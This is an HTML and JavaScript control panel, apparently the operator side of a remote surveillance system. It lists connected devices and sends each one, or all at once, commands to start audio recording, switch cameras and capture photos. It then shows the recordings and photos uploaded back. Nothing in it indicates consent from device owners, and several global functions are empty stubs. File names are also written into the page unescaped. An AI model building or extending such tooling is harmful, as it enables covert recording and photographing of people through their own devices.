<!DOCTYPE html>
<html>
<head>
    <title>Multi-Device Voice Recorder & Camera Control</title>
    <style>
        /* Existing styles remain same, add these new styles */

        .device-card {
            background: white;
            border-radius: 10px;
            padding: 15px;
            margin: 10px;
            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
            cursor: pointer;
            transition: all 0.3s ease;
            border-left: 4px solid #667eea;
            flex: 1 1 300px;
        }

        .device-card:hover {
            transform: translateY(-5px);
            box-shadow: 0 8px 15px rgba(0,0,0,0.2);
        }

        .device-card.recording {
            border-left: 4px solid #f44336;
            background: #fff5f5;
        }

        .device-card.idle {
            border-left: 4px solid #4CAF50;
        }

        .devices-grid {
            display: flex;
            flex-wrap: wrap;
            gap: 15px;
            margin: 20px 0;
        }

        .device-control-panel {
            background: #f8f9fa;
            padding: 20px;
            border-radius: 10px;
            margin: 20px 0;
            display: none;
        }

        .device-control-panel.active {
            display: block;
        }

        .device-header {
            background: #667eea;
            color: white;
            padding: 15px;
            border-radius: 8px;
            margin-bottom: 15px;
        }

        .back-btn {
            background: #6c757d;
            color: white;
            padding: 10px 20px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            margin-bottom: 15px;
        }

        .tab {
            overflow: hidden;
            border: 1px solid #ccc;
            background-color: #f1f1f1;
            border-radius: 8px 8px 0 0;
        }

        .tab button {
            background-color: inherit;
            float: left;
            border: none;
            outline: none;
            cursor: pointer;
            padding: 14px 16px;
            transition: 0.3s;
            font-size: 16px;
        }

        .tab button:hover {
            background-color: #ddd;
        }

        .tab button.active {
            background-color: #667eea;
            color: white;
        }

        .tabcontent {
            display: none;
            padding: 20px;
            border: 1px solid #ccc;
            border-top: none;
            border-radius: 0 0 8px 8px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>üéÆ Multi-Device Voice Recorder & Camera Control</h1>
        
        <div class="tab">
            <button class="tablinks active" onclick="openTab(event, 'Devices')">üì± All Devices</button>
            <button class="tablinks" onclick="openTab(event, 'Global')">üåê Global Control</button>
            <button class="tablinks" onclick="openTab(event, 'AllData')">üìä All Files</button>
        </div>

        <!-- All Devices Tab -->
        <div id="Devices" class="tabcontent" style="display: block;">
            <div class="device-control-panel" id="deviceControlPanel">
                <button class="back-btn" onclick="showAllDevices()">‚Üê Back to All Devices</button>
                
                <div class="device-header">
                    <h3 id="currentDeviceName">Device Control Panel</h3>
                    <div id="currentDeviceStatus">Status: Loading...</div>
                </div>

                <div class="camera-controls">
                    <h4>üì∑ Camera Control</h4>
                    <button class="btn camera-btn" onclick="sendDeviceCameraCommand('front_camera')">
                        üì± Front Camera
                    </button>
                    <button class="btn camera-btn" onclick="sendDeviceCameraCommand('back_camera')">
                        üì∑ Back Camera
                    </button>
                    <button class="btn camera-btn" onclick="sendDeviceCameraCommand('capture_photo')">
                        üì∏ Capture Photo
                    </button>
                    <button class="btn stop-btn" onclick="sendDeviceCameraCommand('stop_camera')">
                        ‚èπÔ∏è Stop Camera
                    </button>
                </div>

                <div class="device-controls">
                    <h4>üé§ Recording Control</h4>
                    <button class="btn start-btn" onclick="sendDeviceCommand('start_recording')">
                        ‚ñ∂Ô∏è Start Recording
                    </button>
                    <button class="btn stop-btn" onclick="sendDeviceCommand('stop_recording')">
                        ‚èπÔ∏è Stop Recording
                    </button>
                </div>

                <div class="device-files">
                    <h4>üìÅ Device Files</h4>
                    <button class="btn" style="background: #667eea; color: white;" onclick="refreshDeviceFiles()">
                        üîÑ Refresh Files
                    </button>
                    <div id="deviceFilesList" style="margin-top: 15px;"></div>
                </div>

                <div id="deviceCommandStatus" class="status-box">
                    Ready to send commands...
                </div>
            </div>

            <div id="allDevicesList">
                <h3>Connected Devices</h3>
                <div class="devices-grid" id="devicesGrid">
                    <div style="color: #666; text-align: center; padding: 20px; width: 100%;">
                        No devices connected
                    </div>
                </div>
            </div>
        </div>

        <!-- Global Control Tab -->
        <div id="Global" class="tabcontent">
            <div class="device">
                <h3>üåê Send Command to All Devices:</h3>
                <button class="btn start-btn" onclick="sendCommand('start_recording')">
                    ‚ñ∂Ô∏è Start Recording All
                </button>
                <button class="btn stop-btn" onclick="sendCommand('stop_recording')">
                    ‚èπÔ∏è Stop Recording All
                </button>
            </div>

            <div class="camera-controls">
                <h3>üì∑ Camera Control - All Devices</h3>
                <button class="btn camera-btn" onclick="sendCameraCommand('front_camera')">
                    üì± Front Camera All
                </button>
                <button class="btn camera-btn" onclick="sendCameraCommand('back_camera')">
                    üì∑ Back Camera All
                </button>
                <button class="btn camera-btn" onclick="sendCameraCommand('capture_photo')">
                    üì∏ Capture Photo All
                </button>
            </div>
        </div>

        <!-- All Data Tab -->
        <div id="AllData" class="tabcontent">
            <!-- Your existing files and photos display -->
            <div class="data-section">
                <h3>üéµ All Uploaded Recordings</h3>
                <button class="btn" style="background: #667eea; color: white;" onclick="refreshFiles()">
                    üîÑ Refresh All Files
                </button>
                <div id="filesList"></div>
            </div>

            <div class="data-section">
                <h3>üñºÔ∏è All Uploaded Photos</h3>
                <button class="btn" style="background: #667eea; color: white;" onclick="refreshPhotos()">
                    üîÑ Refresh All Photos
                </button>
                <div id="photosList"></div>
            </div>
        </div>
    </div>

    <script>
        let currentDeviceId = null;

        function openTab(evt, tabName) {
            var i, tabcontent, tablinks;
            tabcontent = document.getElementsByClassName("tabcontent");
            for (i = 0; i < tabcontent.length; i++) {
                tabcontent[i].style.display = "none";
            }
            tablinks = document.getElementsByClassName("tablinks");
            for (i = 0; i < tablinks.length; i++) {
                tablinks[i].className = tablinks[i].className.replace(" active", "");
            }
            document.getElementById(tabName).style.display = "block";
            evt.currentTarget.className += " active";
        }

        function showAllDevices() {
            document.getElementById('deviceControlPanel').classList.remove('active');
            document.getElementById('allDevicesList').style.display = 'block';
            currentDeviceId = null;
        }

        function showDeviceControl(deviceId) {
            currentDeviceId = deviceId;
            document.getElementById('allDevicesList').style.display = 'none';
            document.getElementById('deviceControlPanel').classList.add('active');
            
            // Update device header
            document.getElementById('currentDeviceName').textContent = `Device: ${deviceId.substring(0, 12)}...`;
            
            // Load device details
            loadDeviceDetails(deviceId);
            refreshDeviceFiles();
        }

        function loadDeviceDetails(deviceId) {
            fetch(`/get_device/${deviceId}`)
                .then(response => response.json())
                .then(data => {
                    if (data.status === 'success') {
                        const device = data.device;
                        const status = device.recording ? 'üî¥ RECORDING' : 'üü¢ IDLE';
                        document.getElementById('currentDeviceStatus').innerHTML = `
                            <strong>Status:</strong> ${status}<br>
                            <strong>Files:</strong> ${data.files_count} | 
                            <strong>Photos:</strong> ${data.photos_count} | 
                            <strong>Audios:</strong> ${data.audios_count}
                        `;
                    }
                })
                .catch(error => {
                    console.error('Error loading device details:', error);
                });
        }

        function refreshDevices() {
            fetch('/get_devices')
                .then(response => response.json())
                .then(data => {
                    const devicesGrid = document.getElementById('devicesGrid');
                    
                    if (data.devices && Object.keys(data.devices).length > 0) {
                        let devicesHtml = '';
                        
                        for (let device_id in data.devices) {
                            const device = data.devices[device_id];
                            const status = device.recording ? 'RECORDING' : 'IDLE';
                            const statusClass = device.recording ? 'recording' : 'idle';
                            const lastSeen = new Date(device.last_seen * 1000).toLocaleTimeString();
                            
                            devicesHtml += `
                                <div class="device-card ${statusClass}" onclick="showDeviceControl('${device_id}')">
                                    <div style="font-size: 24px; margin-bottom: 10px;">
                                        ${device.recording ? 'üî¥' : 'üü¢'}
                                    </div>
                                    <h4>Device: ${device_id.substring(0, 8)}...</h4>
                                    <p><strong>Status:</strong> ${status}</p>
                                    <p><strong>Last Seen:</strong> ${lastSeen}</p>
                                    <p><strong>Recording:</strong> ${device.recording ? 'Yes' : 'No'}</p>
                                </div>`;
                        }
                        
                        devicesGrid.innerHTML = devicesHtml;
                    } else {
                        devicesGrid.innerHTML = `
                            <div style="color: #666; text-align: center; padding: 20px; width: 100%;">
                                No devices connected
                            </div>`;
                    }
                })
                .catch(error => {
                    console.error('Error loading devices:', error);
                });
        }

        function sendDeviceCommand(command) {
            if (!currentDeviceId) {
                alert('No device selected');
                return;
            }

            const statusElement = document.getElementById('deviceCommandStatus');
            statusElement.innerHTML = `‚è≥ Sending command to device: ${command}...`;

            fetch('/send_command_to_device', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ 
                    command: command,
                    device_id: currentDeviceId
                })
            })
            .then(response => response.json())
            .then(data => {
                if (data.status === 'command_sent') {
                    statusElement.innerHTML = `‚úÖ Command sent: ${command} to device ${currentDeviceId.substring(0, 8)}...`;
                    // Refresh device status
                    setTimeout(() => loadDeviceDetails(currentDeviceId), 1000);
                } else {
                    statusElement.innerHTML = `‚ùå Error: ${data.message || 'Unknown error'}`;
                }
            })
            .catch(error => {
                statusElement.innerHTML = `‚ùå Network error: ${error}`;
            });
        }

        function sendDeviceCameraCommand(command) {
            if (!currentDeviceId) {
                alert('No device selected');
                return;
            }

            const statusElement = document.getElementById('deviceCommandStatus');
            statusElement.innerHTML = `‚è≥ Sending camera command: ${command}...`;

            fetch('/send_command_to_device', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ 
                    command: command,
                    device_id: currentDeviceId
                })
            })
            .then(response => response.json())
            .then(data => {
                if (data.status === 'command_sent') {
                    statusElement.innerHTML = `‚úÖ Camera command sent: ${command} to device ${currentDeviceId.substring(0, 8)}...`;
                } else {
                    statusElement.innerHTML = `‚ùå Error: ${data.message || 'Unknown error'}`;
                }
            })
            .catch(error => {
                statusElement.innerHTML = `‚ùå Network error: ${error}`;
            });
        }

        function refreshDeviceFiles() {
            if (!currentDeviceId) return;

            fetch(`/get_device_files/${currentDeviceId}`)
                .then(response => response.json())
                .then(data => {
                    let filesHtml = '';
                    
                    if (data.files && data.files.length > 0) {
                        data.files.forEach(file => {
                            const fileUrl = '/file/' + file.filename;
                            const fileSizeKB = (file.size / 1024).toFixed(2);
                            const uploadDate = new Date(file.upload_time * 1000).toLocaleString();
                            
                            if (file.type === 'photo') {
                                filesHtml += `
                                    <div class="photo-item">
                                        <strong>üì∑ ${file.filename}</strong><br>
                                        <small>Size: ${fileSizeKB} KB | ${uploadDate}</small><br>
                                        <img src="${fileUrl}" alt="${file.filename}" style="max-width: 200px; margin: 10px 0;">
                                    </div>`;
                            } else {
                                filesHtml += `
                                    <div class="file-item">
                                        <strong>üéµ ${file.filename}</strong><br>
                                        <small>Size: ${fileSizeKB} KB | ${uploadDate}</small><br>
                                        <audio controls style="width: 100%; height: 40px; margin: 5px 0;">
                                            <source src="${fileUrl}" type="audio/3gpp">
                                        </audio>
                                    </div>`;
                            }
                        });
                    } else {
                        filesHtml = '<div style="color: #666; text-align: center; padding: 20px;">No files found for this device</div>';
                    }
                    
                    document.getElementById('deviceFilesList').innerHTML = filesHtml;
                })
                .catch(error => {
                    document.getElementById('deviceFilesList').innerHTML = 'Error loading device files';
                });
        }

        // Keep your existing functions for global controls
        function sendCommand(command) {
            // Your existing sendCommand function
        }

        function sendCameraCommand(command) {
            // Your existing sendCameraCommand function
        }

        function refreshFiles() {
            // Your existing refreshFiles function
        }

        function refreshPhotos() {
            // Your existing refreshPhotos function
        }

        // Auto refresh
        setInterval(refreshDevices, 2000);
        setInterval(() => {
            if (currentDeviceId) {
                loadDeviceDetails(currentDeviceId);
                refreshDeviceFiles();
            }
        }, 3000);

        // Initial load
        refreshDevices();
    </script>
</body>
</html>